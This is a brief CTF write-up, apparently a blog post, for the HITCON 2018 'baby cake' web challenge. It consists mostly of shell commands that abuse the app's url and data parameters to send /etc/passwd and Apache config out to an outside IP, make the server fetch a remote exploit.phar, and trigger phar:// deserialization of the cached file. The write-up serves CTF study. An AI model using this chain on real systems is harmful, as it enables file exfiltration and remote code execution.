---
title: 181025-hitcon-babycake-writeup
category: writeup
date: 2018-10-25 22:58:42
---

```bash
wget https://github.com/orangetw/My-CTF-Web-Challenges/raw/master/hitcon-ctf-2018/baby-cake/baby_cake.tgz

abc@ctf:~/Desktop/baby_cake$ tar xzf baby_cake.tgz
abc@ctf:~/Desktop/baby_cake$ find var -type f | wc -l
5543
abc@ctf:~/Desktop/baby_cake$ find var -type d | wc -l
1094
//5543个文件和1094个文件夹，数量巨大。


POST -f "http://13.230.134.135/?url=http://104.128.95.227:8082&data[test]=@/etc/passwd"

POST -f "http://13.230.134.135/?url=http://104.128.95.227:8082&data[test]=@/etc/apache2/sites-enabled/000-default.conf"

GET "http://13.230.134.135/?url=http://104.128.95.227/exploit.phar"

POST http://13.230.134.135/?url=http://IP&data[test]=@phar:///var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/exploit.phar)/body.cache

POST -f "http://13.230.134.135/?url=http://104.128.95.227&data[test]=@phar:///var/www/html/tmp/cache/mycache/112.5.203.145/e0eaad691e608e7cccfa0cc744f84c61/body.cache"
```





主要逻辑在 `src\Controller\PagesController.php` 的 `public function display(...$path)` 。

